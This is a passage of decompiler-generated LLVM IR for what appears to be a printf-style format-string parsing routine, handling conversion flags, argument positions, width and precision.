  %v11_8051e68 = icmp eq i8 %v2_8051e68, 37
  %v1_8051e6b = icmp eq i1 %v11_8051e68, false
  br i1 %v1_8051e6b, label %dec_label_pc_8051e73, label %dec_label_pc_8051e6d

dec_label_pc_8051e6d:                             ; preds = %dec_label_pc_8051e61
  %v1_8051e6d = add i32 %v3_8051e61, 1
  %v2_8051e6d = inttoptr i32 %v1_8051e6d to i8*
  %v3_8051e6d = load i8, i8* %v2_8051e6d, align 1
  %v12_8051e6d = icmp eq i8 %v3_8051e6d, 37
  br i1 %v12_8051e6d, label %dec_label_pc_8051e56, label %dec_label_pc_8051e73

dec_label_pc_8051e73:                             ; preds = %dec_label_pc_8051e6d, %dec_label_pc_8051e61
  %v0_8051e73 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051e75 = load i32, i32* @esi, align 4
  %v2_8051e75 = sub i32 %v0_8051e73, %v1_8051e75
  store i32 %v2_8051e75, i32* @edi, align 4
  %v1_8051e77 = add i32 %v0_8051e7e, 36
  %v2_8051e77 = inttoptr i32 %v1_8051e77 to i32*
  %v3_8051e77 = load i32, i32* %v2_8051e77, align 4
  %v4_8051e77 = icmp eq i32 %v3_8051e77, 0
  br i1 %v4_8051e77, label %dec_label_pc_8051e8b, label %dec_label_pc_8051e7e

dec_label_pc_8051e7e:                             ; preds = %dec_label_pc_8051e73
  store i32 %v3_8051e77, i32* @eax, align 4
  store i32 %v2_8051e75, i32* @ecx, align 4
  store i32 %v1_8051e75, i32* @edx, align 4
  %v0_8051e86 = call i32 @out()
  store i32 %v0_8051e86, i32* %eax.global-to-local, align 4
  %v0_8051e8b.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051e8b

dec_label_pc_8051e8b:                             ; preds = %dec_label_pc_8051e73, %dec_label_pc_8051e7e
  %v0_8051e8b = phi i32 [ %v2_8051e75, %dec_label_pc_8051e73 ], [ %v0_8051e8b.pre, %dec_label_pc_8051e7e ]
  %v1_8051e8b = icmp eq i32 %v0_8051e8b, 0
  %v1_8051e8d = icmp eq i1 %v1_8051e8b, false
  br i1 %v1_8051e8d, label %dec_label_pc_8051dfb.backedge, label %dec_label_pc_8051e93

dec_label_pc_8051e93:                             ; preds = %dec_label_pc_8051e8b
  %v0_8051e93 = load i32, i32* @esp, align 4
  %v1_8051e93 = add i32 %v0_8051e93, 7836
  %v2_8051e93 = inttoptr i32 %v1_8051e93 to i32*
  %v3_8051e93 = load i32, i32* %v2_8051e93, align 4
  store i32 %v3_8051e93, i32* %edx.global-to-local, align 4
  %v1_8051e9a = add i32 %v3_8051e93, 1
  %v2_8051e9a = inttoptr i32 %v1_8051e9a to i8*
  %v3_8051e9a = load i8, i8* %v2_8051e9a, align 1
  %v4_8051e9a = sext i8 %v3_8051e9a to i32
  store i32 %v1_8051e9a, i32* %ecx.global-to-local, align 4
  %v1_8051ea1 = add nsw i32 %v4_8051e9a, -48
  store i32 %v1_8051ea1, i32* %eax.global-to-local, align 4
  %v5_8051ea4 = icmp ult i32 %v1_8051ea1, 9
  %v9_8051ea4 = icmp eq i8 %v3_8051e9a, 57
  %v2_8051ea7 = or i1 %v9_8051ea4, %v5_8051ea4
  br i1 %v2_8051ea7, label %dec_label_pc_8051ea9, label %dec_label_pc_8051ec5

dec_label_pc_8051ea9:                             ; preds = %dec_label_pc_8051e93
  %v1_8051ea9 = add i32 %v3_8051e93, 2
  %v2_8051ea9 = inttoptr i32 %v1_8051ea9 to i8*
  %v3_8051ea9 = load i8, i8* %v2_8051ea9, align 1
  %v12_8051ea9 = icmp eq i8 %v3_8051ea9, 36
  %v1_8051ead = icmp eq i1 %v12_8051ea9, false
  br i1 %v1_8051ead, label %dec_label_pc_8051ec5, label %dec_label_pc_8051eaf

dec_label_pc_8051eaf:                             ; preds = %dec_label_pc_8051ea9
  store i32 %v1_8051ea1, i32* @ebp, align 4
  %v1_8051eb1 = add i32 %v3_8051e93, 3
  store i32 %v1_8051eb1, i32* %eax.global-to-local, align 4
  store i32 %v1_8051eb1, i32* %v2_8051e93, align 4
  %v0_8051ebb = load i32, i32* @esp, align 4
  %v1_8051ebb = add i32 %v0_8051ebb, 40
  %v2_8051ebb = inttoptr i32 %v1_8051ebb to i32*
  store i32 1, i32* %v2_8051ebb, align 4
  br label %dec_label_pc_8051ecf

dec_label_pc_8051ec5:                             ; preds = %dec_label_pc_8051e93, %dec_label_pc_8051ea9
  store i32 %v1_8051e9a, i32* %v2_8051e93, align 4
  store i32 -1, i32* @ebp, align 4
  br label %dec_label_pc_8051ecf

dec_label_pc_8051ecf:                             ; preds = %dec_label_pc_8051eaf, %dec_label_pc_8051ec5
  %v0_8051ecf = load i32, i32* @esp, align 4
  %v1_8051ecf = add i32 %v0_8051ecf, 44
  %v2_8051ecf = inttoptr i32 %v1_8051ecf to i32*
  store i32 0, i32* %v2_8051ecf, align 4
  br label %dec_label_pc_8051eee

dec_label_pc_8051ed9:                             ; preds = %bb233
  br i1 %v4_8051f07, label %bb231, label %bb

bb:                                               ; preds = %dec_label_pc_8051ed9
  %v5_8051ede = shl i32 1, %v2_8051f07
  br label %bb231

bb231:                                            ; preds = %dec_label_pc_8051ed9, %bb
  %storemerge545 = phi i32 [ %v5_8051ede, %bb ], [ 1, %dec_label_pc_8051ed9 ]
  %v4_8051ee0 = phi i32 [ %v5_8051ede, %bb ], [ 1, %dec_label_pc_8051ed9 ]
  store i32 %storemerge545, i32* %eax.global-to-local, align 4
  %v1_8051ee0 = add i32 %v0_8051eee, 44
  %v2_8051ee0 = inttoptr i32 %v1_8051ee0 to i32*
  %v3_8051ee0 = load i32, i32* %v2_8051ee0, align 4
  %v5_8051ee0 = or i32 %v3_8051ee0, %v4_8051ee0
  store i32 %v5_8051ee0, i32* %v2_8051ee0, align 4
  %v0_8051ee4 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051ee4 = add i32 %v0_8051ee4, 1
  store i32 %v1_8051ee4, i32* %eax.global-to-local, align 4
  %v1_8051ee7 = load i32, i32* @esp, align 4
  %v2_8051ee7 = add i32 %v1_8051ee7, 7836
  %v3_8051ee7 = inttoptr i32 %v2_8051ee7 to i32*
  store i32 %v1_8051ee4, i32* %v3_8051ee7, align 4
  br label %dec_label_pc_8051eee

dec_label_pc_8051eee:                             ; preds = %dec_label_pc_8051ecf, %bb231
  %v0_8051eee = load i32, i32* @esp, align 4
  %v1_8051eee = add i32 %v0_8051eee, 7836
  %v2_8051eee = inttoptr i32 %v1_8051eee to i32*
  %v3_8051eee = load i32, i32* %v2_8051eee, align 4
  store i32 %v3_8051eee, i32* %edx.global-to-local, align 4
  %v1_8051ef5 = inttoptr i32 %v3_8051eee to i8*
  %v2_8051ef5 = load i8, i8* %v1_8051ef5, align 1
  %v3_8051ef5 = zext i8 %v2_8051ef5 to i32
  %v4_8051ef5 = load i32, i32* @ebx, align 4
  %v5_8051ef5 = and i32 %v4_8051ef5, -256
  %v6_8051ef5 = or i32 %v5_8051ef5, %v3_8051ef5
  store i32 %v6_8051ef5, i32* @ebx, align 4
  %v2_8051ef7 = sext i8 %v2_8051ef5 to i32
  store i32 %v2_8051ef7, i32* %eax.global-to-local, align 4
  %v1_8051efa = add nsw i32 %v2_8051ef7, -32
  store i32 %v1_8051efa, i32* %ecx.global-to-local, align 4
  %v5_8051efd = icmp ult i32 %v1_8051efa, 31
  %v9_8051efd = icmp eq i8 %v2_8051ef5, 63
  %v2_8051f00 = or i1 %v9_8051efd, %v5_8051efd
  br i1 %v2_8051f00, label %dec_label_pc_8051f02, label %dec_label_pc_8051f0d

dec_label_pc_8051f02:                             ; preds = %dec_label_pc_8051eee
  %v2_8051f07 = urem i32 %v1_8051efa, 32
  %v4_8051f07 = icmp eq i32 %v2_8051f07, 0
  br i1 %v4_8051f07, label %bb233, label %bb232

bb232:                                            ; preds = %dec_label_pc_8051f02
  %v5_8051f07 = lshr i32 75913, %v2_8051f07
  br label %bb233

bb233:                                            ; preds = %dec_label_pc_8051f02, %bb232
  %storemerge546 = phi i32 [ %v5_8051f07, %bb232 ], [ 75913, %dec_label_pc_8051f02 ]
  %v0_8051f09 = phi i32 [ %v5_8051f07, %bb232 ], [ 75913, %dec_label_pc_8051f02 ]
  store i32 %storemerge546, i32* %eax.global-to-local, align 4
  %v2_8051f09 = urem i32 %v0_8051f09, 2
  %v3_8051f09 = icmp eq i32 %v2_8051f09, 0
  %v1_8051f0b = icmp eq i1 %v3_8051f09, false
  br i1 %v1_8051f0b, label %dec_label_pc_8051ed9, label %dec_label_pc_8051f0d

dec_label_pc_8051f0d:                             ; preds = %dec_label_pc_8051eee, %bb233
  %v10_8051f0d = icmp eq i8 %v2_8051ef5, 42
  %v1_8051f10 = icmp eq i1 %v10_8051f0d, false
  br i1 %v1_8051f10, label %dec_label_pc_8051fae, label %dec_label_pc_8051f16

dec_label_pc_8051f16:                             ; preds = %dec_label_pc_8051f0d
  %v1_8051f16 = add i32 %v3_8051eee, 1
  %v2_8051f16 = inttoptr i32 %v1_8051f16 to i8*
  %v3_8051f16 = load i8, i8* %v2_8051f16, align 1
  %v4_8051f16 = sext i8 %v3_8051f16 to i32
  store i32 %v4_8051f16, i32* @ecx, align 4
  %v1_8051f1a = add nsw i32 %v4_8051f16, -48
  store i32 %v1_8051f1a, i32* %eax.global-to-local, align 4
  %v5_8051f1d = icmp ult i32 %v1_8051f1a, 9
  %v9_8051f1d = icmp eq i8 %v3_8051f16, 57
  %v2_8051f20 = or i1 %v9_8051f1d, %v5_8051f1d
  br i1 %v2_8051f20, label %dec_label_pc_8051f22, label %dec_label_pc_8051f67

dec_label_pc_8051f22:                             ; preds = %dec_label_pc_8051f16
  %v1_8051f22 = add i32 %v3_8051eee, 2
  %v2_8051f22 = inttoptr i32 %v1_8051f22 to i8*
  %v3_8051f22 = load i8, i8* %v2_8051f22, align 1
  %v12_8051f22 = icmp eq i8 %v3_8051f22, 36
  %v1_8051f26 = icmp eq i1 %v12_8051f22, false
  br i1 %v1_8051f26, label %dec_label_pc_8051f67, label %dec_label_pc_8051f28

dec_label_pc_8051f28:                             ; preds = %dec_label_pc_8051f22
  %v1_8051f28 = add i32 %v0_8051eee, 7876
  %v2_8051f28 = inttoptr i32 %v1_8051f28 to i32*
  %v3_8051f28 = load i32, i32* %v2_8051f28, align 4
  store i32 %v3_8051f28, i32* %ebx.global-to-local, align 4
  %v2_8051f2f = mul nsw i32 %v4_8051f16, 4
  %v3_8051f2f = add i32 %v2_8051f2f, -192
  %v4_8051f2f = add i32 %v3_8051f2f, %v3_8051f28
  %v5_8051f2f = inttoptr i32 %v4_8051f2f to i32*
  store i32 10, i32* %v5_8051f2f, align 4
  %v0_8051f3a = load i32, i32* %edx.global-to-local, align 4
  %v1_8051f3a = add i32 %v0_8051f3a, 1
  %v2_8051f3a = inttoptr i32 %v1_8051f3a to i8*
  %v3_8051f3a = load i8, i8* %v2_8051f3a, align 1
  %v4_8051f3a = sext i8 %v3_8051f3a to i32
  store i32 %v4_8051f3a, i32* %eax.global-to-local, align 4
  %v0_8051f3e = load i32, i32* @esp, align 4
  %v1_8051f3e = add i32 %v0_8051f3e, 7872
  %v2_8051f3e = inttoptr i32 %v1_8051f3e to i32*
  %v3_8051f3e = load i32, i32* %v2_8051f3e, align 4
  store i32 %v3_8051f3e, i32* @ecx, align 4
  %v2_8051f45 = sext i8 %v3_8051f3a to i32
  %v3_8051f45 = mul nsw i32 %v2_8051f45, 12
  store i32 %v3_8051f45, i32* %eax.global-to-local, align 4
  %v2_8051f48 = add i32 %v3_8051f3e, -576
  %v3_8051f48 = add i32 %v2_8051f48, %v3_8051f45
  %v4_8051f48 = inttoptr i32 %v3_8051f48 to i32*
  %v5_8051f48 = load i32, i32* %v4_8051f48, align 4
  store i32 %v5_8051f48, i32* %eax.global-to-local, align 4
  %v1_8051f4f = add i32 %v0_8051f3e, 40
  %v2_8051f4f = inttoptr i32 %v1_8051f4f to i32*
  store i32 1, i32* %v2_8051f4f, align 4
  %v0_8051f57 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051f57 = load i32, i32* @esp, align 4
  %v2_8051f57 = add i32 %v1_8051f57, 48
  %v3_8051f57 = inttoptr i32 %v2_8051f57 to i32*
  store i32 %v0_8051f57, i32* %v3_8051f57, align 4
  %v0_8051f5b = load i32, i32* %edx.global-to-local, align 4
  %v1_8051f5b = add i32 %v0_8051f5b, 3
  store i32 %v1_8051f5b, i32* %eax.global-to-local, align 4
  %v1_8051f5e = load i32, i32* @esp, align 4
  %v2_8051f5e = add i32 %v1_8051f5e, 7836
  %v3_8051f5e = inttoptr i32 %v2_8051f5e to i32*
  store i32 %v1_8051f5b, i32* %v3_8051f5e, align 4
  br label %dec_label_pc_8051f99

dec_label_pc_8051f67:                             ; preds = %dec_label_pc_8051f16, %dec_label_pc_8051f22
  %v1_8051f67 = add i32 %v0_8051eee, 40
  %v2_8051f67 = inttoptr i32 %v1_8051f67 to i32*
  %v3_8051f67 = load i32, i32* %v2_8051f67, align 4
  %v4_8051f67 = icmp eq i32 %v3_8051f67, 0
  %v1_8051f6c = icmp eq i1 %v4_8051f67, false
  br i1 %v1_8051f6c, label %dec_label_pc_80533af.loopexit70, label %dec_label_pc_8051f72

dec_label_pc_8051f72:                             ; preds = %dec_label_pc_8051f67
  %v1_8051f72 = add i32 %v0_8051eee, 36
  %v2_8051f72 = inttoptr i32 %v1_8051f72 to i32*
  %v3_8051f72 = load i32, i32* %v2_8051f72, align 4
  %v4_8051f72 = icmp eq i32 %v3_8051f72, 0
  %v1_8051f77 = add i32 %v0_8051eee, 48
  %v2_8051f77 = inttoptr i32 %v1_8051f77 to i32*
  store i32 0, i32* %v2_8051f77, align 4
  br i1 %v4_8051f72, label %dec_label_pc_8051f92, label %dec_label_pc_8051f81

dec_label_pc_8051f81:                             ; preds = %dec_label_pc_8051f72
  %v0_8051f81 = load i32, i32* @esp, align 4
  %v1_8051f81 = add i32 %v0_8051f81, 32
  %v2_8051f81 = inttoptr i32 %v1_8051f81 to i32*
  %v3_8051f81 = load i32, i32* %v2_8051f81, align 4
  store i32 %v3_8051f81, i32* %ebx.global-to-local, align 4
  %v1_8051f85 = inttoptr i32 %v3_8051f81 to i32*
  %v2_8051f85 = load i32, i32* %v1_8051f85, align 4
  store i32 %v2_8051f85, i32* %edx.global-to-local, align 4
  %v1_8051f87 = add i32 %v2_8051f85, 4
  store i32 %v1_8051f87, i32* %eax.global-to-local, align 4
  %v1_8051f8a = inttoptr i32 %v2_8051f85 to i32*
  %v2_8051f8a = load i32, i32* %v1_8051f8a, align 4
  store i32 %v2_8051f8a, i32* %edx.global-to-local, align 4
  store i32 %v1_8051f87, i32* %v1_8051f85, align 4
  %v0_8051f8e = load i32, i32* %edx.global-to-local, align 4
  %v1_8051f8e = load i32, i32* @esp, align 4
  %v2_8051f8e = add i32 %v1_8051f8e, 48
  %v3_8051f8e = inttoptr i32 %v2_8051f8e to i32*
  store i32 %v0_8051f8e, i32* %v3_8051f8e, align 4
  br label %dec_label_pc_8051f92

dec_label_pc_8051f92:                             ; preds = %dec_label_pc_8051f72, %dec_label_pc_8051f81
  %v0_8051f92 = load i32, i32* @esp, align 4
  %v1_8051f92 = add i32 %v0_8051f92, 7836
  %v2_8051f92 = inttoptr i32 %v1_8051f92 to i32*
  %v3_8051f92 = load i32, i32* %v2_8051f92, align 4
  %v4_8051f92 = add i32 %v3_8051f92, 1
  store i32 %v4_8051f92, i32* %v2_8051f92, align 4
  br label %dec_label_pc_8051f99

dec_label_pc_8051f99:                             ; preds = %dec_label_pc_8051f28, %dec_label_pc_8051f92
  %v0_8051f99 = load i32, i32* @esp, align 4
  %v1_8051f99 = add i32 %v0_8051f99, 48
  %v2_8051f99 = inttoptr i32 %v1_8051f99 to i32*
  %v3_8051f99 = load i32, i32* %v2_8051f99, align 4
  %v5_8051f99 = icmp slt i32 %v3_8051f99, 0
  %v1_8051f9e = icmp eq i1 %v5_8051f99, false
  br i1 %v1_8051f9e, label %dec_label_pc_8051fc6, label %dec_label_pc_8051fa0

dec_label_pc_8051fa0:                             ; preds = %dec_label_pc_8051f99
  %v1_8051fa0 = add i32 %v0_8051f99, 44
  %v2_8051fa0 = inttoptr i32 %v1_8051fa0 to i32*
  %v3_8051fa0 = load i32, i32* %v2_8051fa0, align 4
  %v4_8051fa0 = or i32 %v3_8051fa0, 8192
  store i32 %v4_8051fa0, i32* %v2_8051fa0, align 4
  %v0_8051fa8 = load i32, i32* @esp, align 4
  %v1_8051fa8 = add i32 %v0_8051fa8, 48
  %v2_8051fa8 = inttoptr i32 %v1_8051fa8 to i32*
  %v3_8051fa8 = load i32, i32* %v2_8051fa8, align 4
  %v4_8051fa8 = sub i32 0, %v3_8051fa8
  store i32 %v4_8051fa8, i32* %v2_8051fa8, align 4
  br label %dec_label_pc_8051fc6

dec_label_pc_8051fae:                             ; preds = %dec_label_pc_8051f0d
  store i32 %v1_8051eee, i32* @eax, align 4
  %v0_8051fb5 = call i32 @getint()
  store i32 %v0_8051fb5, i32* %eax.global-to-local, align 4
  %v2_8051fba = icmp slt i32 %v0_8051fb5, 0
  %v1_8051fbc = load i32, i32* @esp, align 4
  %v2_8051fbc = add i32 %v1_8051fbc, 48
  %v3_8051fbc = inttoptr i32 %v2_8051fbc to i32*
  store i32 %v0_8051fb5, i32* %v3_8051fbc, align 4
  br i1 %v2_8051fba, label %dec_label_pc_80533af.loopexit70, label %dec_label_pc_8051fc6

dec_label_pc_8051fc6:                             ; preds = %dec_label_pc_8051fae, %dec_label_pc_8051f99, %dec_label_pc_8051fa0
  %v0_8051fc6 = load i32, i32* @esp, align 4
  %v1_8051fc6 = add i32 %v0_8051fc6, 7836
  %v2_8051fc6 = inttoptr i32 %v1_8051fc6 to i32*
  %v3_8051fc6 = load i32, i32* %v2_8051fc6, align 4
  store i32 %v3_8051fc6, i32* @ebx, align 4
  %v1_8051fcd = add i32 %v0_8051fc6, 52
  %v2_8051fcd = inttoptr i32 %v1_8051fcd to i32*
  store i32 -1, i32* %v2_8051fcd, align 4
  %v0_8051fd5 = load i32, i32* @ebx, align 4
  %v1_8051fd5 = inttoptr i32 %v0_8051fd5 to i8*
  %v2_8051fd5 = load i8, i8* %v1_8051fd5, align 1
  %v11_8051fd5 = icmp eq i8 %v2_8051fd5, 46
  %v1_8051fd8 = icmp eq i1 %v11_8051fd5, false
  br i1 %v1_8051fd8, label %dec_label_pc_805207c, label %dec_label_pc_8051fde

dec_label_pc_8051fde:                             ; preds = %dec_label_pc_8051fc6
  %v1_8051fde = add i32 %v0_8051fd5, 1
  %v2_8051fde = inttoptr i32 %v1_8051fde to i8*
  %v3_8051fde = load i8, i8* %v2_8051fde, align 1
  %v12_8051fde = icmp eq i8 %v3_8051fde, 42
  store i32 %v1_8051fde, i32* %eax.global-to-local, align 4
  %v1_8051fe5 = icmp eq i1 %v12_8051fde, false
  br i1 %v1_8051fe5, label %dec_label_pc_8052065, label %dec_label_pc_8051fe7

dec_label_pc_8051fe7:                             ; preds = %dec_label_pc_8051fde
  %v1_8051fe7 = add i32 %v0_8051fd5, 2
  %v2_8051fe7 = inttoptr i32 %v1_8051fe7 to i8*
  %v3_8051fe7 = load i8, i8* %v2_8051fe7, align 1
  %v4_8051fe7 = sext i8 %v3_8051fe7 to i32
  store i32 %v4_8051fe7, i32* %edx.global-to-local, align 4
  %v1_8051feb = add nsw i32 %v4_8051fe7, -48
  store i32 %v1_8051feb, i32* %eax.global-to-local, align 4
  %v5_8051fee = icmp ult i32 %v1_8051feb, 9
  %v9_8051fee = icmp eq i8 %v3_8051fe7, 57
  %v2_8051ff1 = or i1 %v9_8051fee, %v5_8051fee
  br i1 %v2_8051ff1, label %dec_label_pc_8051ff3, label %dec_label_pc_8052030

dec_label_pc_8051ff3:                             ; preds = %dec_label_pc_8051fe7
  %v1_8051ff3 = add i32 %v0_8051fd5, 3
  %v2_8051ff3 = inttoptr i32 %v1_8051ff3 to i8*
  %v3_8051ff3 = load i8, i8* %v2_8051ff3, align 1
  %v12_8051ff3 = icmp eq i8 %v3_8051ff3, 36
  %v1_8051ff7 = icmp eq i1 %v12_8051ff3, false
  br i1 %v1_8051ff7, label %dec_label_pc_8052030, label %dec_label_pc_8051ff9

dec_label_pc_8051ff9:                             ; preds = %dec_label_pc_8051ff3
  %v0_8051ff9 = load i32, i32* @esp, align 4
  %v1_8051ff9 = add i32 %v0_8051ff9, 7876
  %v2_8051ff9 = inttoptr i32 %v1_8051ff9 to i32*
  %v3_8051ff9 = load i32, i32* %v2_8051ff9, align 4
  store i32 %v3_8051ff9, i32* %eax.global-to-local, align 4
  %v2_8052000 = mul nsw i32 %v4_8051fe7, 4
  %v3_8052000 = add i32 %v2_8052000, -192
  %v4_8052000 = add i32 %v3_8052000, %v3_8051ff9
  %v5_8052000 = inttoptr i32 %v4_8052000 to i32*
  store i32 10, i32* %v5_8052000, align 4
  %v0_805200b = load i32, i32* @ebx, align 4
  %v1_805200b = add i32 %v0_805200b, 2
  %v2_805200b = inttoptr i32 %v1_805200b to i8*
  %v3_805200b = load i8, i8* %v2_805200b, align 1
  %v4_805200b = sext i8 %v3_805200b to i32
  store i32 %v4_805200b, i32* %eax.global-to-local, align 4
  %v0_805200f = load i32, i32* @esp, align 4
  %v1_805200f = add i32 %v0_805200f, 7872
  %v2_805200f = inttoptr i32 %v1_805200f to i32*
  %v3_805200f = load i32, i32* %v2_805200f, align 4
  store i32 %v3_805200f, i32* %edx.global-to-local, align 4
  %v2_8052016 = sext i8 %v3_805200b to i32
  %v3_8052016 = mul nsw i32 %v2_8052016, 12
  store i32 %v3_8052016, i32* %eax.global-to-local, align 4
  %v2_8052019 = add i32 %v3_805200f, -576
  %v3_8052019 = add i32 %v2_8052019, %v3_8052016
  %v4_8052019 = inttoptr i32 %v3_8052019 to i32*
  %v5_8052019 = load i32, i32* %v4_8052019, align 4
  %v2_8052020 = add i32 %v0_805200f, 52
  %v3_8052020 = inttoptr i32 %v2_8052020 to i32*
  store i32 %v5_8052019, i32* %v3_8052020, align 4
  %v0_8052024 = load i32, i32* @ebx, align 4
  %v1_8052024 = add i32 %v0_8052024, 4
  store i32 %v1_8052024, i32* %eax.global-to-local, align 4
  %v1_8052027 = load i32, i32* @esp, align 4
  %v2_8052027 = add i32 %v1_8052027, 7836
  %v3_8052027 = inttoptr i32 %v2_8052027 to i32*
  store i32 %v1_8052024, i32* %v3_8052027, align 4
  br label %dec_label_pc_805207c

dec_label_pc_8052030:                             ; preds = %dec_label_pc_8051fe7, %dec_label_pc_8051ff3
  %v0_8052030 = load i32, i32* @esp, align 4
  %v1_8052030 = add i32 %v0_8052030, 40
  %v2_8052030 = inttoptr i32 %v1_8052030 to i32*
  %v3_8052030 = load i32, i32* %v2_8052030, align 4
  %v4_8052030 = icmp eq i32 %v3_8052030, 0
  %v1_8052035 = icmp eq i1 %v4_8052030, false
  br i1 %v1_8052035, label %dec_label_pc_80533af.loopexit70, label %dec_label_pc_805203b

dec_label_pc_805203b:                             ; preds = %dec_label_pc_8052030
  %v1_805203b = add i32 %v0_8052030, 36
  %v2_805203b = inttoptr i32 %v1_805203b to i32*
  %v3_805203b = load i32, i32* %v2_805203b, align 4
  %v4_805203b = icmp eq i32 %v3_805203b, 0
  %v1_8052040 = add i32 %v0_8052030, 52
  %v2_8052040 = inttoptr i32 %v1_8052040 to i32*
  store i32 0, i32* %v2_8052040, align 4
  br i1 %v4_805203b, label %dec_label_pc_805205b, label %dec_label_pc_805204a

dec_label_pc_805204a:                             ; preds = %dec_label_pc_805203b
  %v0_805204a = load i32, i32* @esp, align 4
  %v1_805204a = add i32 %v0_805204a, 32
  %v2_805204a = inttoptr i32 %v1_805204a to i32*
  %v3_805204a = load i32, i32* %v2_805204a, align 4
  store i32 %v3_805204a, i32* @ecx, align 4
  %v1_805204e = inttoptr i32 %v3_805204a to i32*
  %v2_805204e = load i32, i32* %v1_805204e, align 4
  store i32 %v2_805204e, i32* %edx.global-to-local, align 4
  %v1_8052050 = add i32 %v2_805204e, 4
  store i32 %v1_8052050, i32* %eax.global-to-local, align 4
  %v1_8052053 = inttoptr i32 %v2_805204e to i32*
  %v2_8052053 = load i32, i32* %v1_8052053, align 4
  store i32 %v2_8052053, i32* %edx.global-to-local, align 4
  store i32 %v1_8052050, i32* %v1_805204e, align 4
  %v0_8052057 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052057 = load i32, i32* @esp, align 4
  %v2_8052057 = add i32 %v1_8052057, 52
  %v3_8052057 = inttoptr i32 %v2_8052057 to i32*
  store i32 %v0_8052057, i32* %v3_8052057, align 4
  br label %dec_label_pc_805205b

dec_label_pc_805205b:                             ; preds = %dec_label_pc_805203b, %dec_label_pc_805204a
  %v0_805205b = load i32, i32* @esp, align 4
  %v1_805205b = add i32 %v0_805205b, 7836
  %v2_805205b = inttoptr i32 %v1_805205b to i32*
  %v3_805205b = load i32, i32* %v2_805205b, align 4
  %v4_805205b = add i32 %v3_805205b, 2
  store i32 %v4_805205b, i32* %v2_805205b, align 4
  br label %dec_label_pc_805207c

dec_label_pc_8052065:                             ; preds = %dec_label_pc_8051fde
  %v1_8052065 = load i32, i32* @esp, align 4
  %v2_8052065 = add i32 %v1_8052065, 7836
  %v3_8052065 = inttoptr i32 %v2_8052065 to i32*
  store i32 %v1_8051fde, i32* %v3_8052065, align 4
  %v0_805206c = load i32, i32* @esp, align 4
  %v1_805206c = add i32 %v0_805206c, 7836
  store i32 %v1_805206c, i32* @eax, align 4
  %v0_8052073 = call i32 @getint()
  store i32 %v0_8052073, i32* %eax.global-to-local, align 4
  %v1_8052078 = load i32, i32* @esp, align 4
  %v2_8052078 = add i32 %v1_8052078, 52
  %v3_8052078 = inttoptr i32 %v2_8052078 to i32*
  store i32 %v0_8052073, i32* %v3_8052078, align 4
  br label %dec_label_pc_805207c

dec_label_pc_805207c:                             ; preds = %dec_label_pc_8051fc6, %dec_label_pc_805205b, %dec_label_pc_8051ff9, %dec_label_pc_8052065
  %v0_805207c = load i32, i32* @esp, align 4
  %v1_805207c = add i32 %v0_805207c, 56
  %v2_805207c = inttoptr i32 %v1_805207c to i32*
  store i32 0, i32* %v2_805207c, align 4
  br label %dec_label_pc_8052084

dec_label_pc_8052084:                             ; preds = %dec_label_pc_80520bb, %dec_label_pc_805207c
  %v0_8052084 = load i32, i32* @esp, align 4
  %v1_8052084 = add i32 %v0_8052084, 7836
  %v2_8052084 = inttoptr i32 %v1_8052084 to i32*
  %v3_8052084 = load i32, i32* %v2_8052084, align 4
  store i32 %v3_8052084, i32* @ebx, align 4
  %v1_805208b = inttoptr i32 %v3_8052084 to i8*
  %v2_805208b = load i8, i8* %v1_805208b, align 1
  %v3_805208b = sext i8 %v2_805208b to i32
  store i32 %v3_805208b, i32* %edx.global-to-local, align 4
  %v1_805208e = add nsw i32 %v3_805208b, -65
  store i32 %v1_805208e, i32* %eax.global-to-local, align 4
  %v5_8052091 = icmp ult i32 %v1_805208e, 57
  %v9_8052091 = icmp eq i8 %v2_805208b, 122
  %v2_8052094 = or i1 %v9_8052091, %v5_8052091
  br i1 %v2_8052094, label %dec_label_pc_805209a, label %dec_label_pc_80533af

dec_label_pc_805209a:                             ; preds = %dec_label_pc_8052084
  %v2_805209a = add i32 %v0_8052084, 56
  %v3_805209a = inttoptr i32 %v2_805209a to i32*
  %v4_805209a = load i32, i32* %v3_805209a, align 4
  %v6_805209a = mul i32 %v4_805209a, 58
  store i32 %v6_805209a, i32* %eax.global-to-local, align 4
  %v2_805209f = add nsw i32 %v3_805208b, 134563839
  %v3_805209f = add i32 %v2_805209f, %v6_805209a
  %v4_805209f = inttoptr i32 %v3_805209f to i8*
  %v5_805209f = load i8, i8* %v4_805209f, align 1
  %v6_805209f = zext i8 %v5_805209f to i32
  %v7_805209f = load i32, i32* @ecx, align 4
  %v8_805209f = and i32 %v7_805209f, -256
  %v9_805209f = or i32 %v8_805209f, %v6_805209f
  store i32 %v9_805209f, i32* @ecx, align 4
  %v1_80520a6 = add i32 %v3_8052084, 1
  store i32 %v1_80520a6, i32* %v2_8052084, align 4
  %v0_80520b0 = load i32, i32* @ecx, align 4
  %v1_80520b0 = urem i32 %v0_80520b0, 256
  store i32 %v1_80520b0, i32* @edx, align 4
  %v1_80520b3 = add nsw i32 %v1_80520b0, -1
  store i32 %v1_80520b3, i32* %eax.global-to-local, align 4
  %tmp543 = icmp ult i32 %v1_80520b3, 8
  br i1 %tmp543, label %dec_label_pc_80520bb, label %dec_label_pc_80520c1

dec_label_pc_80520bb:                             ; preds = %dec_label_pc_805209a
  %v1_80520bb = load i32, i32* @esp, align 4
  %v2_80520bb = add i32 %v1_80520bb, 56
  %v3_80520bb = inttoptr i32 %v2_80520bb to i32*
  store i32 %v1_80520b0, i32* %v3_80520bb, align 4
  br label %dec_label_pc_8052084

dec_label_pc_80520c1:                             ; preds = %dec_label_pc_805209a
  %v3_80520c1 = trunc i32 %v0_80520b0 to i8
  %v4_80520c1 = icmp eq i8 %v3_80520c1, 0
  br i1 %v4_80520c1, label %dec_label_pc_80533af.loopexit70, label %dec_label_pc_80520c9

dec_label_pc_80520c9:                             ; preds = %dec_label_pc_80520c1
  %v10_80520c9 = icmp eq i8 %v3_80520c1, 19
  %v1_80520cc = icmp eq i1 %v10_80520c9, false
  %v0_80520d7 = load i32, i32* @ebp, align 4
  %v2_80520d7 = icmp slt i32 %v0_80520d7, 0
  br i1 %v1_80520cc, label %dec_label_pc_80520d7, label %dec_label_pc_80520ce

dec_label_pc_80520ce:                             ; preds = %dec_label_pc_80520c9
  br i1 %v2_80520d7, label %dec_label_pc_80520ce.dec_label_pc_8052122_crit_edge, label %dec_label_pc_80533af.loopexit70

